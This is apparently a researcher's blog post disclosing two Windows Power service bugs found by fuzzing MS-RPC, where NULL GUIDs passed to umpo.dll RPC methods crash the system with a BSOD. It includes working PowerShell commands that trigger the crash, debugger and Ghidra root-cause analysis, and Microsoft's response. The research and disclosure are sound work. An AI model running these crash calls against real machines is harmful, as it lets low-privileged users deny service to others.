---
title: Unplugging your Power service with my special GUID
description: Crashing Windows by exploiting two vulnerabilities in the power service 
author: remco
date: 2025-04-04 11:33:00 +0800
categories: [Research, Windows]
tags: [research, windows, exploits]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/unplugging-power-service/0.png
---

During my research into MS-RPC (Microsoft Remote Procedure Call), I stumbled upon two RPC calls that can crash the Power service in Windows. Both calls take among others an `GUID` as parameter. When specifying a `NULL` value for the `GUID` when invoking the RPC call, the Power service crashes and causes an BSOD.

One of the RPC calls, `UmpoRpcReadProfileAlias`, only works on Windows-11 based systems, so Windows 11, Windows server 2025, etc. The other call, `UmpoRpcReadFromUserPowerKey`, was tested successfully against Windows-10 systems as well. Any user can invoke the RPC calls. 

The impact is that an low privileged user is able to DoS a Windows client or server by crashing the Power service that results in an BSOD. The Power service cannot be turned off because it is a core system service responsible for managing power settings, battery status, and power policies. Windows does not allow stopping or disabling it through Services (services.msc) or via command-line tools like `sc config` or `net stop`.

## Discovering the vulnerability
I have started developing a fuzzer to make it easier to research MS-RPC using an automated approach. It uses [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager) to generate RPC clients to interact with RPC servers. By using these clients, we can invoke the RPC interface's their methods. This led to the idea of creating a fuzzer that can automatically send random inputs to RPC servers. This fuzzer is still in development, and this fuzzer will also not be the focus for this blogpost.

While fuzzing the RPC implementation of `C:\Windows\System32\umpo.dll`, the system suddently crashed and caused the following BSOD:

![BSOD shows that a critical process died (don't ask me why it is green)](/assets/img/posts/unplugging-power-service/1.png)
_BSOD shows that a critical process died (don't ask me why it is green)_

### Finding the responsible RPC call
The fuzzer keeps a logfile of RPC calls that it is going to invoke before invoking them. The last line of the logfile before crashing the system noted:

```
RPCserver: umpo.dll 
Procedure: UmpoRpcReadProfileAlias
Params: , System.Byte[], 1001337
------------------------
```

## Manually reproducing the RPC call
With this information, we can now use NtObjectManager to manually reproduce the RPC call. We can create a RPC client from where we can view the vulnerable method and it's parameters:
```powershell
$rpcinterfaces = "C:\windows\system32\umpo.dll" | Get-RpcServer
$client = $rpcinterfaces | Get-RpcClient
$client | gm | Where-Object { $_.Name -eq 'UmpoRpcReadProfileAlias' } | fl
```
Output:

![Output of the definition for the RPC method UmpoRpcReadProfileAlias](/assets/img/posts/unplugging-power-service/2.png)
_Output of the definition for the RPC method UmpoRpcReadProfileAlias_

It has the following defintion:

```c#
UmpoRpcReadProfileAlias(System.Nullable[guid] p0, byte[] p1, int p2)
```

To manually invoke the RPC call, we need to define a parameter type for `System.Nullable[guid]` and `byte[]` as follows:

We start by creating a Byte array with just random inputs:
```powershell
$bytearray = ([System.Text.Encoding]::UTF8.GetBytes("incendiumrocks"))
```

If we take another look at the last lines of the logfile, we can see what parameters it used to cause the BSOD. The first parameter (for the `System.Nullable[guid]`), shows an empty value. Which most likely is `NULL`. So why was it `NULL`?

The fuzzer uses an activator to dynamically create instances for complex parameters like `Struct` or `GUID`. And since this parameter is Nullable, it initiated `$Null` as value.

```powershell
$method = $client.GetType().GetMethods() |? { $_.Name -eq 'UmpoRpcReadProfileAlias' }
$p0 = $method.GetParameters()[0]
$guid = [Activator]::CreateInstance($p0.ParameterType)
```
We can see that the `GUID` now is equal to `NULL`:
```powershell
$guid -eq $Null
True
```

Now we can invoke the RPC call just as the fuzzer did:
```powershell
$client.UmpoRpcReadProfileAlias($guid,$bytearray,1001337)
```

Which causes the BSOD again:

![BSOD shows that a critical process died](/assets/img/posts/unplugging-power-service/1.png)
_BSOD shows that a critical process died_

## Root cause analysis
If we take a look at the parameter values for the vulnerable method, we can clearly see that the `GUID` is nullable:
```c#
UmpoRpcReadProfileAlias(System.Nullable[guid] p0, byte[] p1, int p2)
```
This means that it is not necessary to provide an `GUID` and that if it is not specified, it will default to `NULL`. If we specify `$Null` instead of our `$GUID` the system also crashes, which is what we expected since both are exactly the same.

### Attaching a debugger
To see what is going on, we can attach Windbg to the `Power` process. Why the Power process? Well the `umpo.dll` has this as file description: *User-mode Power Service*.

When invoking the RPC call with the `NULL` value for the `GUID`, the debugger catches an access violation:
![Windbg shows access violation when invoking the RPC call with a NULL value](/assets/img/posts/unplugging-power-service/3.png)
_Windbg shows access violation when invoking the RPC call with a NULL value_

Taking a look at the call stack, we can see it crashes on `RtlStringFromGUIDEx`
![Windbg call stack](/assets/img/posts/unplugging-power-service/4.png)
_Windbg call stack_

Let's take a look at the register values as well

![Register values at the crash](/assets/img/posts/unplugging-power-service/5.png)
_Register values at the crash_

The instruction loads a byte (8-bit value) from memory at `rbx + 0x0E` into `ecx`, and fills the upper 24 bits of `ecx` with zeros. `ds:00000000'0000000e=??` indicates that the memory at `rbx + 0x0E` is uninitialized or invalid, leading to a crash (access violation) if the pointer `rbx` is incorrect.

Let's parse a valid `GUID` and compare the output in Windbg. We first set an breakpoint at the `RtlStringFromGUIDEx` instruction.

```
bp !ntdll!RtlStringFromGUIDEx+0x3d
```

And we create a valid `GUID` in PowerShell:

```powershell
$guid = [Guid]::NewGuid()
$guid

Guid
----
c97a92f2-3e2c-4344-b1d5-4836f00cd959
```

We invoke the RPC call and the breakpoint gets hit in Windbg.
![Breakpoint RtlStringFromGUIDEx gets hit](/assets/img/posts/unplugging-power-service/6.png)
_Breakpoint RtlStringFromGUIDEx gets hit_

Taking a look at the registers, we can now see that `RBX` is `0000026897240004`:

![Register values for valid GUID](/assets/img/posts/unplugging-power-service/7.png)
_Register values for valid GUID_

If we continue the debugger we can see that the RPC call now gets a valid return value:

![RPC call returns a normal return value](/assets/img/posts/unplugging-power-service/8.png)
_RPC call returns a normal return value_

### Reversing the function in Ghidra
To get a better understanding of the root cause, I reversed the function in Ghidra. The underneath code is not the direct output from Ghidra, but instead I reversed it to better understandable code.
```c
uint UmpoReadProfileAlias(guid, bytearray, longlong profileSize) {
    uint status;
    longlong registryHandle[2];
    UNICODE_STRING unicodeGuid;
    undefined8 unicodeBuffer;
    undefined8 unicodeBufferExtra;
    
    // Initialize the unicode string buffer
    unicodeBuffer = 0;
    unicodeBufferExtra = 0;
    
    // Check if the input profile size is zero
    if (profileSize == 0) {
        return ERROR_INVALID_PARAMETER;  // Equivalent to 0x57
    }
    
    registryHandle[0] = -1;
    
    // Check if the root key is invalid
    if (UmpoPpmProfileEventsRootKey == -1) {
        return ERROR_FILE_NOT_FOUND;  // Equivalent to 2
    }
    
    // Convert GUID to Unicode String
    RtlInitUnicodeString(&unicodeGuid, 0);
    status = RtlStringFromGUID(guid, &unicodeGuid);
    
    if (status == 0) {
        // Try opening the registry key
        status = RegOpenKeyExW(UmpoPpmProfileEventsRootKey, unicodeBufferExtra, 0, KEY_READ, registryHandle);
        
        if (status == 0) {
            // Query the registry value
            status = RegQueryValueExW(registryHandle[0], L"Name", 0, 0, bytearray, profileSize);
            
            // If query failed with an unexpected error, trigger telemetry
            if ((status & 0xfffffffd) != 0) {
                MicrosoftTelemetryAssertTriggeredNoArgs();
            }
        } else if (status != ERROR_FILE_NOT_FOUND) {
            // Trigger telemetry if the registry open operation failed with an unexpected error
            MicrosoftTelemetryAssertTriggeredNoArgs();
        }
    }
    
    // Free allocated Unicode string
    RtlFreeUnicodeString(&unicodeGuid);
    
    // Close the registry key if it was successfully opened
    if (registryHandle[0] != -1) {
        RegCloseKey(registryHandle[0]);
    }
    
    return status;
}
```

The function [RtlStringFromGUID](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlstringfromguid) expects a valid GUID. If GUID is `NULL`, it causes an access violation (segmentation fault) when attempting to read or process it. The GUID is not checked and so a `NULL` is being parsed.

## Another one
After excluding the `UmpoReadProfileAlias` RPC method and running the fuzzer again, it got another BSOD. Now the last lines of the logfile were:
```
RPCserver: umpo.dll 
Procedure: UmpoRpcReadFromUserPowerKey
Params: , , , 1001337, 1001337, System.Byte[], 1001337, 
------------------------
```

Okay, let's take a look at the definition of the `UmpoRpcReadFromUserPowerKey` method:

```c#
UmpoRpcReadFromUserPowerKey(System.Nullable[guid] p0, System.Nullable[guid] p1, System.Nullable[guid] p2, int p3, int p4, byte[] p5, int p6, System.Nullable[NtCoreLib.Ndr.Marshal.NdrEnum16] p8)
```

This method also takes 3 `System.Nullable[guid]` parameters. To see which of the three causes the BSOD, we can manually try each Guid parameter with a NULL value:

```powershell
$guid = [guid]"00000000-0000-0000-0000-000000000000"
$client.UmpoRpcReadFromUserPowerKey($guid,$guid,$guid,1001337,1001337,$bytearray,1001337,$complex)

p5                        p7 p8 retval
--                        -- -- ------
{105, 110, 99, 101…} 1001337        87

$client.UmpoRpcReadFromUserPowerKey($guid,$guid,$null,1001337,1001337,$bytearray,1001337,$complex)

p5                        p7 p8 retval
--                        -- -- ------
{105, 110, 99, 101…} 1001337        87

$client.UmpoRpcReadFromUserPowerKey($guid,$null,$null,1001337,1001337,$bytearray,1001337,$complex)

p5                        p7 p8 retval
--                        -- -- ------
{105, 110, 99, 101…} 1001337        87
```

But when invoking the next RPC call (the first GUID also being `NULL`), then the system crashes:

```powershell
$client.UmpoRpcReadFromUserPowerKey($null,$null,$null,1001337,1001337,$bytearray,1001337,$complex)
```

![BSOD shows that a critical process died](/assets/img/posts/unplugging-power-service/1.png)
_BSOD shows that a critical process died_

### Windbg
When invoking the RPC call, we see another access violation, but now for `UmpoReadFromUserPowerKey`

![Windbg shows access violation for UmpoReadFromUserPowerKey](/assets/img/posts/unplugging-power-service/9.png)
_Windbg shows access violation for UmpoReadFromUserPowerKey_

The instruction at `0x00007ffac7178461` is trying to move a `quadword (8 bytes)` from the memory address pointed to `r14` into `rax`. The memory at `r14` is `00000000'00000000`, meaning it's a NULL pointer dereference. Since the mov instruction attempts to read from an invalid address, this results in an access violation.

### Reversing in Ghidra
I was interested in why the second and third `GUID` parameters can be `NULL` but the first cannot. So I set the base address of umpo.dll and searched for the `UmpoReadFromUserPowerKey` function. Then I searched for the memory address at where the access violation in Windbg took place `0x00007ffac7178461`.

![Ghidra instruction that causes an access violation](/assets/img/posts/unplugging-power-service/10.png)
_Ghidra instruction that causes an access violation_

Interestingly, there is a conditional check for our firstguid:

![Conditional check on firstguid](/assets/img/posts/unplugging-power-service/11.png)
_Conditional check on firstguid_
```c
if ((PtrUmpoFullPowerPlanSupportDisabled != '\0') && (firstguid != (longlong *)0x0))
```
Somehow the firstguid is not equal to `NULL` here, else the "vulnerablefunction" would not be triggered. However, the pointer to the firstguid is not checked and is being dereferenced to `lVar16`:

```c
if (param_4 != '\0') {
    lVar16 = *firstguid; // Causes the crash
}
```

The pointers for secondguid and thirdguid dont seem to get dereferenced in the program, which would explain why a `NULL` value for only the firstguid causes an crash.

## Proof of Concepts
Using the fantastic tool NtObjectManager, we can format a RPC interface into an raw C# RPC client. This allows to use the client in .NET and invoke the RPC calls from an executable. Both the PoC for `UmpoRpcReadProfileAlias` and `UmpoReadFromUserPowerKey` can be found on [GitHub](https://github.com/1ncendium/Windows_PowerSvc_BSOD).

**UmpoRpcReadProfileAlias**
- Works against Windows 11, Windows Server 2025
- RPC call not available on Windows 10

**UmpoReadFromUserPowerKey**
- Successfully tested against Windows 10 and above
- Successfully tested against Windows Server 2019 and above

# Reporting to Microsoft
I reported both vulnerabilities to Microsoft and their response was: *This does not pose an immediate threat and is of moderate severity, due to the fact this requires cold reboot or causes BSOD. This is local only as the code checks for remote RPC via UmpoIsClientLocal and bails if remote. We have shared the report with the team responsible for maintaining the product or service. They will review for a potential fix and take appropriate action as needed to help keep customers protected*

Since the RPC calls cannot be exploited remotely through an named pipe, it is a [moderate severity](https://www.microsoft.com/en-us/msrc/sdlbugbar). Microsoft only takes immediate action for important/critical vulnerabilities. However, I hope that my detailed analysis help in creating a fix somewhere in the near future.

If the case gets resolved into a moderate or low issue, you are released from [Microsoft's CVD](https://www.microsoft.com/en-us/msrc/cvd?msockid=2a7a1a7d1d6369e434450fda1ca16801). However, this blogpost was also approved by Microsoft before publishing.

## Credits and resources
I want to thank [@FrankSpierings](https://github.com/FrankSpierings) for the help on the root cause analysis and figuring out if we can further exploit the vulnerabilities then just DoS. I also want to thank [@JamesForshaw](https://x.com/tiraniddo) for NtObjectManager.

## Resources
- [https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)
- [https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
- [https://ghidra-sre.org/](https://ghidra-sre.org/)
